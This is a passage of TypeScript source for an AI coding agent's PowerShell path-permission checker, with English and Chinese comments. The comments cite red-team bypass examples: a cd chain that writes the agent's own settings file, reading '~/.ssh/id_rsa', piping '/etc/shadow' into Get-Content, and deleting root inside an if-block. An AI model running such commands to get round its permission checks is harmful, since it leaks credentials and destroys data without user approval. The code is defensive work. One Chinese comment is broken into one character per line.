          if (nextVal && !isPowerShellParameter(nextVal, nextType)) {
            value = nextVal
            checkArgElementType(i + 1)
            i++ // Skip the value
          }
        }
        if (value) {
          paths.push(value)
        }
// leafOnly 参数（如 New-Item -Name）：只有纯叶子名才敢当路径抽，
// 因为它实际是相对另一个参数解析的，而我们是相对 cwd 解析 —— 会错位。
      } else if (
        config.leafOnlyPathParams &&
        matchesParam(paramLower, config.leafOnlyPathParams)
      ) {
        // Leaf-only path parameter (e.g., New-Item -Name). PowerShell resolves
        // this relative to ANOTHER parameter (-Path), not cwd. validatePath
        // resolves against cwd (L930), so non-leaf values (separators,
        // traversal) resolve to the WRONG location and can miss deny rules
        // (deny→ask downgrade). Extract simple leaf filenames; flag anything
        // path-like.
        let value: string | undefined
        if (colonIdx > 0) {
          const rawValue = arg.substring(colonIdx + 1)
          if (hasComplexColonValue(rawValue)) {
            hasUnvalidatablePathArg = true
          } else {
            value = rawValue
          }
        } else {
          const nextVal = args[i + 1]
          const nextType = elementTypes ? elementTypes[i + 2] : undefined
          if (nextVal && !isPowerShellParameter(nextVal, nextType)) {
            value = nextVal
            checkArgElementType(i + 1)
            i++
          }
        }
        if (value !== undefined) {
          if (
            value.includes('/') ||
            value.includes('\\') ||
            value === '.' ||
            value === '..'
          ) {
            // Non-leaf: separators or traversal. Can't resolve correctly
            // without joining against -Path. Force ask.
            hasUnvalidatablePathArg = true
          } else {
            // Simple leaf: extract. Resolves to cwd/leaf (slightly wrong —
            // should be <-Path>/leaf) but -Path extraction covers the
            // directory, and a leaf filename can't traverse out of anywhere.
            paths.push(value)
          }
        }
// 已知开关：**不消费**后面的 token（开关不带值）。
// 注意 -Confirm:$false 这种冒号写法是自包含的一个 token，落在这里也正确。
      } else if (matchesParam(paramLower, switchParams)) {
        // Known switch parameter — takes no value, do NOT consume next arg.
        // (Colon syntax on a switch, e.g., -Confirm:$false, is self-contained
        // in one token and correctly falls through here without consuming.)
// 已知带值但非路径的参数（如 -Encoding UTF8）：吃掉它的值，不做路径校验。
// 但**必须**检查元素类型 —— 否则 `-Value $env:SECRET` 会因为类型没被检查
// 而在 acceptEdits 模式下被静默放行（值在运行时才确定）。
      } else if (matchesParam(paramLower, valueParams)) {
        // Known value-taking non-path parameter (e.g., -Encoding UTF8, -Filter *.txt).
        // Consume its value; do NOT validate as path, but DO check elementType.
        // SECURITY: A Variable elementType (e.g., $env:ANTHROPIC_API_KEY) in any
        // argument position means the runtime value is not statically knowable.
        // Without this check, `-Value $env:SECRET` would be silently auto-allowed
        // in acceptEdits mode because the Variable elementType was never examined.
        if (colonIdx > 0) {
          // Colon syntax: -Value:$env:FOO — the value is embedded in the token.
          // The outer CommandParameterAst 'Parameter' type masks the inner
          // expression type. Check for expression markers that indicate a
          // non-static value (mirrors pathParams colon-syntax guards).
          const rawValue = arg.substring(colonIdx + 1)
          if (hasComplexColonValue(rawValue)) {
            hasUnvalidatablePathArg = true
          }
        } else {
          const nextArg = args[i + 1]
          const nextArgType = elementTypes ? elementTypes[i + 2] : undefined
          if (nextArg && !isPowerShellParameter(nextArg, nextArgType)) {
            checkArgElementType(i + 1)
            i++ // Skip the parameter's value
          }
        }
// ===== 未知参数 ===== 这里是全表最重要的结构性修复（对应上方英文注释）：
// 不去猜它是开关还是带值（猜错都会吞掉或放过真正的路径），
// 而是直接把整条命令标记为不可判定，由调用方强制 ask。
// 这终结了「漏记一个开关就出一个洞」的打地鼠局面。
      } else {
        // Unknown parameter — we do not understand this invocation.
        // SECURITY: This is the structural fix for the KNOWN_SWITCH_PARAMS
        // whack-a-mole. Rather than guess whether this param is a switch
        // (and risk swallowing a positional path) or takes a value (and
        // risk the same), we flag the whole command as unvalidatable.
        // The caller will force an ask.
        hasUnvalidatablePathArg = true
// 即便不认识这个参数，如果它是冒号语法（-Unknown:/etc/hosts），
// 冒号后面那个值**可能**就是路径 —— 抽出来，好让 deny 规则有机会命中
// （否则值被困在 token 里，paths 为空，deny 规则永远查不到，等于 deny 降级成 ask）。
        // SECURITY: Even though we don't recognize this param, if it uses
        // colon syntax (-UnknownParam:/etc/hosts) the bound value might be
        // a filesystem path. Extract it into paths[] so deny-rule matching
        // still runs. Without this, the value is trapped inside the single
        // token and paths=[] means deny rules are never consulted —
        // downgrading deny to ask. This is defense-in-depth: the primary
        // fix is adding all known aliases to pathParams above.
        if (colonIdx > 0) {
          const rawValue = arg.substring(colonIdx + 1)
          if (!hasComplexColonValue(rawValue)) {
            paths.push(rawValue)
          }
        }
        // Continue the loop so we still extract any recognizable paths
        // (useful for the ask message), but the flag ensures overall 'ask'.
      }
      continue
    }

// 位置参数：默认都当路径抽（PowerShell 里第一个位置参数通常就是 -Path）。
    // Positional arguments: extract as paths (e.g., Get-Content file.txt)
    // The first positional arg is typically the source path.
    // Skip leading positionals that are non-path values (e.g., iwr's -Uri).
// positionalSkip：跳过开头几个「不是路径」的位置参数（如 iwr 的 URL）。
    if (positionalsSeen < positionalSkip) {
      positionalsSeen++
      continue
    }
    positionalsSeen++
    checkArgElementType(i)
    paths.push(arg)
  }

  return {
    paths,
    operationType: config.operationType,
    hasUnvalidatablePathArg,
    optionalWrite: config.optionalWrite ?? false,
  }
}

/**
 * 【中文】**对外主入口**：校验整条 PowerShell 命令涉及的所有路径。
 *
 * @param parsed AST 解析结果
 * @param compoundCommandHasCd 整条复合命令里是否含「改当前目录」的 cmdlet
 *        （由上层算好传进来；为 true 时相对路径全部不可信）
 * @returns deny（有 deny 规则命中）/ ask（需要用户确认）/ passthrough（本层没意见）
 *
 * 关键设计：**两遍扫描**（见 1541 行注释）。
 * 必须遍历完所有语句再决定 —— 否则第 1 条语句返回 ask 就提前返回，
 * 第 2 条语句里的 deny 规则永远查不到，用户就能批准一条包含禁止路径的命令。
 */
/**
 * Checks path constraints for PowerShell commands.
 * Extracts file paths from the parsed AST and validates they are
 * within allowed directories.
 *
 * @param compoundCommandHasCd - Whether the full compound command contains a
 *   cwd-changing cmdlet (Set-Location/Push-Location/Pop-Location/New-PSDrive,
 *   excluding no-op Set-Location-to-CWD). When true, relative paths in ANY
 *   statement cannot be trusted — PowerShell executes statements sequentially
 *   and a cd in statement N changes the cwd for statement N+1, but this
 *   validator resolves all paths against the stale Node process cwd.
 *   BashTool parity (BashTool/pathValidation.ts:630-655).
 *
 * @returns
 * - 'ask' if any path command tries to access outside allowed directories
 * - 'deny' if a deny rule explicitly blocks the path
 * - 'passthrough' if no path commands were found or all paths are valid
 */
export function checkPathConstraints(
  input: { command: string },
  parsed: ParsedPowerShellCommand,
  toolPermissionContext: ToolPermissionContext,
  compoundCommandHasCd = false,
): PermissionResult {
// 解析失败 → passthrough（不是放行！）：交回上层按常规规则处理，通常会弹框。
  if (!parsed.valid) {
    return {
      behavior: 'passthrough',
      message: 'Cannot validate paths for unparsed command',
    }
  }

// deny 优先于 ask 的实现：先把所有语句跑完，途中遇到的第一个 ask 先**记下来**，
// 但只要有任何一条语句命中 deny 就立即 return deny。
  // SECURITY: Two-pass approach — check ALL statements/paths so deny rules
  // always take precedence over ask. Without this, an ask on statement 1
  // could return before checking statement 2 for deny rules, letting the
  // user approve a command that includes a denied path.
  let firstAsk: PermissionResult | undefined

  for (const statement of parsed.statements) {
    const result = checkPathConstraintsForStatement(
      statement,
      toolPermissionContext,
      compoundCommandHasCd,
    )
    if (result.behavior === 'deny') {
      return result
    }
    if (result.behavior === 'ask' && !firstAsk) {
      firstAsk = result
    }
  }

  return (
    firstAsk ?? {
      behavior: 'passthrough',
      message: 'All path constraints validated successfully',
    }
  )
}

/**
 * 【中文】校验**单条语句**的路径约束（含重定向、嵌套命令、管道来源等复杂情况）。
 *
 * 返回策略同 checkPathConstraints：deny 立即返回，ask 只记第一个，
 * 全部通过才 passthrough。
 */
function checkPathConstraintsForStatement(
  statement: ParsedPowerShellCommand['statements'][number],
  toolPermissionContext: ToolPermissionContext,
  compoundCommandHasCd = false,
): PermissionResult {
  const cwd = getCwd()
  let firstAsk: PermissionResult | undefined

// ===== 复合命令 + 改目录 → 相对路径全部不可信（BashTool 同构）=====
// 中文复述上方英文注释：
//   复合命令里若某句改了 cwd，后面语句的相对路径在**运行时**是相对新 cwd，
//   而校验器用的是**陈旧的** getCwd() 快照 —— 两者不是同一个地方。
//   例子：Set-Location ./.claude; Set-Content ./settings.json '...'
//     校验器以为写 /project/settings.json（不是配置文件，放行）
//     实际写 /project/.claude/settings.json（Claude 的权限配置！）
//   曾考虑过「沿着语句链模拟 cwd」的更宽松方案，但要处理 push/pop 栈语义、
//   无参 Set-Location、PSDrive 映射、条件/循环里 cd 未必执行等一堆情况 ——
//   风险太高，最终选择保守：一律要求人工批准。
//   另外这里连 **read** 也拦（比 BashTool 更严）：从错位路径读同样会泄密。
  // SECURITY: BashTool parity — block path operations in compound commands
  // containing a cwd-changing cmdlet (BashTool/pathValidation.ts:630-655).
  //
  // When the compound contains Set-Location/Push-Location/Pop-Location/
  // New-PSDrive, relative paths in later statements resolve against the
  // CHANGED cwd at runtime, but this validator resolves them against the
  // STALE getCwd() snapshot. Example attack (finding #3):
  //   Set-Location ./.claude; Set-Content ./settings.json '...'
  // Validator sees ./settings.json → /project/settings.json (not a config file).
  // Runtime writes /project/.claude/settings.json (Claude's permission config).
  //
  // ALTERNATIVE APPROACH (rejected): simulate cwd through the statement chain
  // — after `Set-Location ./.claude`, validate subsequent statements with
  // cwd='./.claude'. This would be more permissive but requires careful
  // handling of:
  //   - Push-Location/Pop-Location stack semantics
  //   - Set-Location with no args (→ home on some platforms)
  //   - New-PSDrive root mapping (arbitrary filesystem root)
  //   - Conditional/loop statements where cd may or may not execute
  //   - Error cases where the cd target can't be statically determined
  // For now we take the conservative approach of requiring manual approval.
  //
  // Unlike BashTool which gates on `operationType !== 'read'`, we also block
  // READS (finding #27): `Set-Location ~; Get-Content ./.ssh/id_rsa` bypasses
  // Read(~/.ssh/**) deny rules because the validator matched the deny against
  // /project/.ssh/id_rsa. Reads from mis-resolved paths leak data just as
  // writes destroy it. We still run deny-rule matching below (via firstAsk,
  // not early return) so explicit deny rules on the stale-resolved path are
  // honored — deny > ask in the caller's reduce.
// 注意这里只是**先记下** ask（不是 return），这样下面仍会继续跑 deny 规则匹配 ——
// 保证 deny > ask 的优先级。
  if (compoundCommandHasCd) {
    firstAsk = {
      behavior: 'ask',
      message:
        'Compound command changes working directory (Set-Location/Push-Location/Pop-Location/New-PSDrive) — relative paths cannot be validated against the original cwd and require manual approval',
      decisionReason: {
        type: 'other',
        reason:
          'Compound command contains cd with path operation — manual approval required to prevent path resolution bypass',
      },
    }
  }

// 管道里有「非命令元素」（字符串字面量、变量、数组表达式）时要特别处理：
// 例 `'/etc/passwd' | Remove-Item` —— 字符串被绑到 Remove-Item 的 -Path 上，
// 但 Remove-Item 自己**没有显式参数**，于是抽不出任何路径，会被误判为安全。
// 所以只要下游有 cmdlet 且上游有表达式源，就强制 ask（读和写都算）。
  // SECURITY: Track whether this statement contains a non-CommandAst pipeline
  // element (string literal, variable, array expression). PowerShell pipes
  // these values to downstream cmdlets, often binding to -Path. Example:
  // `'/etc/passwd' | Remove-Item` — the string is piped to Remove-Item's -Path,
  // but Remove-Item has no explicit args so extractPathsFromCommand returns
  // zero paths and the command would passthrough. If ANY downstream cmdlet
  // appears alongside an expression source, we force an ask — the piped
  // path is unvalidatable regardless of operation type (reads leak data;
  // writes destroy it).
// 顺带记下那个表达式的**文本**，好拿去猜 deny 规则（finding #23）：
// `'.git/hooks/pre-commit' | Remove-Item` 应该被 Edit(.git/**) **拒绝**，
// 而不是仅仅 ask。
  let hasExpressionPipelineSource = false
  // Track the non-CommandAst element's text for deny-rule guessing (finding #23).
  // `'.git/hooks/pre-commit' | Remove-Item` — path comes via pipeline, paths=[]
  // from extractPathsFromCommand, so the deny loop below never iterates. We
  // feed the pipeline-source text through checkDenyRuleForGuessedPath so
  // explicit Edit(.git/**) deny rules still fire.
  let pipelineSourceText: string | undefined

  for (const cmd of statement.commands) {
    if (cmd.elementType !== 'CommandAst') {
      hasExpressionPipelineSource = true
      pipelineSourceText = cmd.text
      continue
    }

// 每个命令先抽路径，再按下面几条规则判断。
    const { paths, operationType, hasUnvalidatablePathArg, optionalWrite } =
      extractPathsFromCommand(cmd)

    // SECURITY: Cmdlet receiving piped path from expression source.
    // `'/etc/shadow' | Get-Content` — Get-Content extracts zero paths
    // (no explicit args). The path comes from the pipeline, which we cannot
    // statically validate. Previously exempted reads (`operationType !== 'read'`),
    // but that was a bypass (review comment 2885739292): reads from
    // unvalidatable paths are still a security risk. Ask regardless of op type.
// 管道来源不可判定：先用来源文本去撞 deny 规则（撞上就 deny），
// 撞不上才降级成 ask。
    if (hasExpressionPipelineSource) {
      const canonical = resolveToCanonical(cmd.name)
      // SECURITY (finding #23): Before falling back to ask, check if the
      // pipeline-source text matches a deny rule. `'.git/hooks/pre-commit' |
      // Remove-Item` should DENY (not ask) when Edit(.git/**) is configured.
      // Strip surrounding quotes (string literals are quoted in .text) and
      // feed through the same deny-guess helper used for ::/backtick paths.
      if (pipelineSourceText !== undefined) {
        const stripped = pipelineSourceText.replace(/^['"]|['"]$/g, '')
        const denyHit = checkDenyRuleForGuessedPath(
          stripped,
          cwd,
          toolPermissionContext,
          operationType,
        )
        if (denyHit) {
          return {
            behavior: 'deny',
            message: `${canonical} targeting '${denyHit.resolvedPath}' was blocked by a deny rule`,
            decisionReason: { type: 'rule', rule: denyHit.rule },
          }
        }
      }
      firstAsk ??= {
        behavior: 'ask',
        message: `${canonical} receives its path from a pipeline expression source that cannot be statically validated and requires manual approval`,
      }
      // Don't continue — fall through to path loop so deny rules on
      // extracted paths are still checked.
    }

// 数组字面量 / 子表达式等复杂参数：例 `-Path ./safe.txt, /etc/passwd` 在 AST 里是
// **一个** 'Other' 元素，PowerShell 会写到数组里的所有路径上，而我们只看到一段文本。
    // SECURITY: Array literals, subexpressions, and other complex
    // argument types cannot be statically validated. An array literal
    // like `-Path ./safe.txt, /etc/passwd` produces a single 'Other'
    // element whose combined text may resolve within CWD while
    // PowerShell actually writes to ALL paths in the array.
// 注意这里是 `firstAsk ??=` 而不是 return —— 故意**不中断**，
// 好让下面仍能对已抽出的路径跑 deny 匹配。
    if (hasUnvalidatablePathArg) {
      const canonical = resolveToCanonical(cmd.name)
      firstAsk ??= {
        behavior: 'ask',
        message: `${canonical} uses a parameter or complex path expression (array literal, subexpression, unknown parameter, etc.) that cannot be statically validated and requires manual approval`,
      }
      // Don't continue — fall through to path loop so deny rules on
      // extracted paths are still checked.
    }

/
/
 
写
类
 
c
m
d
l
e
t
 
却
一
个
路
径
都
没
抽
到
 
→
 
也
要
 
a
s
k
（
无
法
确
定
写
目
标
，
不
能
乐
观
放
行
）
。
    // SECURITY: Write cmdlet in CMDLET_PATH_CONFIG that extracted zero paths.
    // Either (a) the cmdlet has no args at all (`Remove-Item` alone —
    // PowerShell will error, but we shouldn't optimistically assume that), or
    // (b) we failed to recognize the path among the args (shouldn't happen
    // with the unknown-param fail-safe, but defense-in-depth). Conservative:
    // write operation with no validated target → ask.
    // Read cmdlets and pop-location (pathParams: []) are exempt.
    // optionalWrite cmdlets (Invoke-WebRequest/Invoke-RestMethod without
    // -OutFile) are ALSO exempt — they only write to disk when a pathParam is
    // present; without one, output goes to the pipeline. The
    // hasUnvalidatablePathArg check above already covers unknown-param cases.
// 三个豁免条件要同时理解：
//   读类 cmdlet 豁免（读没抽到路径通常只是没参数，危害小）；
//   optionalWrite 豁免（iwr 不带 -OutFile 时只输出到管道，不写盘）；
//   不在 CMDLET_PATH_CONFIG 里的 cmdlet 本来就不归这里管。
    if (
      operationType !== 'read' &&
      !optionalWrite &&
      paths.length === 0 &&
      CMDLET_PATH_CONFIG[resolveToCanonical(cmd.name)]
    ) {
      const canonical = resolveToCanonical(cmd.name)
      firstAsk ??= {
        behavior: 'ask',
        message: `${canonical} is a write operation but no target path could be determined; requires manual approval`,
      }
      continue
    }

// ===== 删除系统关键路径的硬拒绝（与 BashTool 的 isDangerousRemovalPath 对齐）=====
// rm /、rm ~、rm /etc 这类**无条件 deny**，用户不能批准删除 system32。
// 这里靠别名解析把 rm / del / ri / rd / rmdir / erase 全归并到 remove-item。
    // SECURITY: bash-parity hard-deny for removal cmdlets on
    // system-critical paths. BashTool has isDangerousRemovalPath which
    // hard-DENIES `rm /`, `rm ~`, `rm /etc`, etc. regardless of user config.
    // Port: remove-item (and aliases rm/del/ri/rd/rmdir/erase → resolveToCanonical)
    // on a dangerous path → deny (not ask). User cannot approve system32 deletion.
    const isRemoval = resolveToCanonical(cmd.name) === 'remove-item'

// 逐个路径校验。
    for (const filePath of paths) {
      // Hard-deny removal of dangerous system paths (/, ~, /etc, etc.).
      // Check the RAW path (pre-realpath) first: safeResolvePath can
      // canonicalize '/' → 'C:\' (Windows) or '/var/...' → '/private/var/...'
      // (macOS) which defeats isDangerousRemovalPath's string comparisons.
// 先看**原始形态**：realpath 会把 / 规范化成 C:\（Windows）或把 /var 改写成
// /private/var（macOS），那样字符串比较型判断就全部失配了。
      if (isRemoval && isDangerousRemovalRawPath(filePath)) {
        return dangerousRemovalDeny(filePath)
      }

      const { allowed, resolvedPath, decisionReason } = validatePath(
        filePath,
        cwd,
        toolPermissionContext,
        operationType,
      )

// 再看**解析后**的路径：这一步能抓住「符号链接指向受保护位置」的情况。
      // Also check the resolved path — catches symlinks that resolve to a
      // protected location.
      if (isRemoval && isDangerousRemovalPath(resolvedPath)) {
        return dangerousRemovalDeny(resolvedPath)
      }

// 不允许 → 组装提示文案 + 建议（建议是可一键放行的权限更新项）。
      if (!allowed) {
        const canonical = resolveToCanonical(cmd.name)
        const workingDirs = Array.from(
          allWorkingDirectories(toolPermissionContext),
        )
        const dirListStr = formatDirectoryList(workingDirs)

// 文案分两类：decisionReason 是 other/safetyCheck 时直接说原因；
// 否则说「只允许访问这些工作目录」并列出目录（让用户知道边界在哪）。
        const message =
          decisionReason?.type === 'other' ||
          decisionReason?.type === 'safetyCheck'
            ? decisionReason.reason
            : `${canonical} targeting '${resolvedPath}' was blocked. For security, Claude Code may only access files in the allowed working directories for this session: ${dirListStr}.`

// 命中 deny 规则 → 立即 return deny（不再继续，也不给建议 —— 禁止就是禁止）。
        if (decisionReason?.type === 'rule') {
          return {
            behavior: 'deny',
            message,
            decisionReason,
          }
        }

// 不是 deny 的话，顺手给出「一键放行」的建议（加目录 / 切到 acceptEdits 模式），
// 这些建议会显示在权限确认框里，用户点一下就生效。
        const suggestions: PermissionUpdate[] = []
        if (resolvedPath) {
          if (operationType === 'read') {
            const suggestion = createReadRuleSuggestion(
              getDirectoryForPath(resolvedPath),
              'session',
            )
            if (suggestion) {
              suggestions.push(suggestion)
            }
          } else {
            suggestions.push({
              type: 'addDirectories',
              directories: [getDirectoryForPath(resolvedPath)],
              destination: 'session',
            })
          }
        }

        if (operationType === 'write' || operationType === 'create') {
          suggestions.push({
            type: 'setMode',
            mode: 'acceptEdits',
            destination: 'session',
          })
        }

// 又是 ??=：只保留**第一个** ask，后面的不覆盖（第一个通常最贴切）。
        firstAsk ??= {
          behavior: 'ask',
          message,
          blockedPath: resolvedPath,
          decisionReason,
          suggestions,
        }
      }
    }
  }

// 控制流语句（if / foreach 的花括号体）里的命令由解析器收集到 nestedCommands，
// 这里按**同样的标准**再过一遍 —— 不能只查顶层。
  // Also check nested commands from control flow
  if (statement.nestedCommands) {
    for (const cmd of statement.nestedCommands) {
      const { paths, operationType, hasUnvalidatablePathArg, optionalWrite } =
        extractPathsFromCommand(cmd)

      if (hasUnvalidatablePathArg) {
        const canonical = resolveToCanonical(cmd.name)
        firstAsk ??= {
          behavior: 'ask',
          message: `${canonical} uses a parameter or complex path expression (array literal, subexpression, unknown parameter, etc.) that cannot be statically validated and requires manual approval`,
        }
        // Don't continue — fall through to path loop for deny checks.
      }

// 与主循环同构的「写类却无路径」检查。
      // SECURITY: Write cmdlet with zero extracted paths (mirrors main loop).
      // optionalWrite cmdlets exempt — see main-loop comment.
      if (
        operationType !== 'read' &&
        !optionalWrite &&
        paths.length === 0 &&
        CMDLET_PATH_CONFIG[resolveToCanonical(cmd.name)]
      ) {
        const canonical = resolveToCanonical(cmd.name)
        firstAsk ??= {
          behavior: 'ask',
          message: `${canonical} is a write operation but no target path could be determined; requires manual approval`,
        }
        continue
      }

// 删除危险路径的硬拒绝在嵌套命令里**也要做**：
// 否则 `if ($true) { Remove-Item / }` 会走 nestedCommands 分支，
// 把 deny 降级成 ask —— 用户就能批准删除根目录了。
      // SECURITY: bash-parity hard-deny for removal on system-critical
      // paths — mirror the main-loop check above. Without this,
      // `if ($true) { Remove-Item / }` routes through nestedCommands and
      // downgrades deny→ask, letting the user approve root deletion.
      const isRemoval = resolveToCanonical(cmd.name) === 'remove-item'

      for (const filePath of paths) {
        // Check the RAW path first (pre-realpath); see main-loop comment.
        if (isRemoval && isDangerousRemovalRawPath(filePath)) {
          return dangerousRemovalDeny(filePath)
        }

        const { allowed, resolvedPath, decisionReason } = validatePath(
          filePath,
          cwd,
          toolPermissionContext,
          operationType,
        )

        if (isRemoval && isDangerousRemovalPath(resolvedPath)) {
          return dangerousRemovalDeny(resolvedPath)
        }

        if (!allowed) {
          const canonical = resolveToCanonical(cmd.name)
          const workingDirs = Array.from(
            allWorkingDirectories(toolPermissionContext),
          )
          const dirListStr = formatDirectoryList(workingDirs)

          const message =
            decisionReason?.type === 'other' ||
            decisionReason?.type === 'safetyCheck'
              ? decisionReason.reason
              : `${canonical} targeting '${resolvedPath}' was blocked. For security, Claude Code may only access files in the allowed working directories for this session: ${dirListStr}.`

          if (decisionReason?.type === 'rule') {
            return {
              behavior: 'deny',
              message,
              decisionReason,
            }
          }

          const suggestions: PermissionUpdate[] = []
          if (resolvedPath) {
            if (operationType === 'read') {
              const suggestion = createReadRuleSuggestion(
                getDirectoryForPath(resolvedPath),
                'session',
              )
              if (suggestion) {
                suggestions.push(suggestion)
              }
            } else {
              suggestions.push({
                type: 'addDirectories',
                directories: [getDirectoryForPath(resolvedPath)],
                destination: 'session',
              })
            }
          }

          if (operationType === 'write' || operationType === 'create') {
            suggestions.push({
              type: 'setMode',
              mode: 'acceptEdits',
              destination: 'session',
            })
          }

          firstAsk ??= {
            behavior: 'ask',
            message,
            blockedPath: resolvedPath,
            decisionReason,
            suggestions,
          }
        }
      }

// 管道表达式源的兜底（与主循环同款）。刻意放在路径循环**之后**，
// 这样更具体的 ask（带 blockedPath 和建议的）能靠 ??= 先占住位置。
      // Red-team P11/P14: step 5 at powershellPermissions.ts:970 already
      // catches this via the same synthetic-CommandExpressionAst mechanism —
      // this is belt-and-suspenders so the nested loop doesn't rely on that
      // accident. Placed AFTER the path loop so specific asks (blockedPath,
      // suggestions) win via ??=.
      if (hasExpressionPipelineSource) {
        firstAsk ??= {
          behavior: 'ask',
          message: `${resolveToCanonical(cmd.name)} appears inside a control-flow or chain statement where piped expression sources cannot be statically validated and requires manual approval`,
        }
      }
    }
  }

// 嵌套命令上的重定向（来自 && / || 链条）也要校验 —— 重定向会写文件。
  // Check redirections on nested commands (e.g., from && / || chains)
  if (statement.nestedCommands) {
    for (const cmd of statement.nestedCommands) {
      if (cmd.redirections) {
        for (const redir of cmd.redirections) {
          if (redir.isMerging) continue
          if (!redir.target) continue
          if (isNullRedirectionTarget(redir.target)) continue

          const { allowed, resolvedPath, decisionReason } = validatePath(
            redir.target,
            cwd,
            toolPermissionContext,
            'create',
          )

          if (!allowed) {
            const workingDirs = Array.from(
              allWorkingDirectories(toolPermissionContext),
            )
            const dirListStr = formatDirectoryList(workingDirs)

            const message =
              decisionReason?.type === 'other' ||
              decisionReason?.type === 'safetyCheck'
                ? decisionReason.reason
                : `Output redirection to '${resolvedPath}' was blocked. For security, Claude Code may only write to files in the allowed working directories for this session: ${dirListStr}.`

            if (decisionReason?.type === 'rule') {
              return {
                behavior: 'deny',
                message,
                decisionReason,
              }
            }

            firstAsk ??= {
              behavior: 'ask',
              message,
              blockedPath: resolvedPath,
              decisionReason,
              suggestions: [
                {
                  type: 'addDirectories',
                  directories: [getDirectoryForPath(resolvedPath)],
                  destination: 'session',
                },
              ],
            }
          }
        }
      }
    }
  }

// 语句级重定向（> file.txt）：按 'create' 操作校验目标文件。
// 三个跳过条件：合并型重定向（2>&1）、没有目标、目标是 $null（只是丢弃输出）。
  // Check file redirections
  if (statement.redirections) {
    for (const redir of statement.redirections) {
      if (redir.isMerging) continue
      if (!redir.target) continue
      if (isNullRedirectionTarget(redir.target)) continue

      const { allowed, resolvedPath, decisionReason } = validatePath(
        redir.target,
        cwd,
        toolPermissionContext,
        'create',
      )

      if (!allowed) {
        const workingDirs = Array.from(
          allWorkingDirectories(toolPermissionContext),
        )
        const dirListStr = formatDirectoryList(workingDirs)

        const message =
          decisionReason?.type === 'other' ||
          decisionReason?.type === 'safetyCheck'
            ? decisionReason.reason
            : `Output redirection to '${resolvedPath}' was blocked. For security, Claude Code may only write to files in the allowed working directories for this session: ${dirListStr}.`

        if (decisionReason?.type === 'rule') {
          return {
            behavior: 'deny',
            message,
            decisionReason,
          }
        }

        firstAsk ??= {
          behavior: 'ask',
          message,
          blockedPath: resolvedPath,
          decisionReason,
          suggestions: [
            {
              type: 'addDirectories',
              directories: [getDirectoryForPath(resolvedPath)],
              destination: 'session',
            },
          ],
        }
      }
    }
  }

// 收尾：没有累积任何 ask 就返回 passthrough（本层没意见）。
  return (
    firstAsk ?? {
      behavior: 'passthrough',
      message: 'All path constraints validated successfully',
    }
  )
}
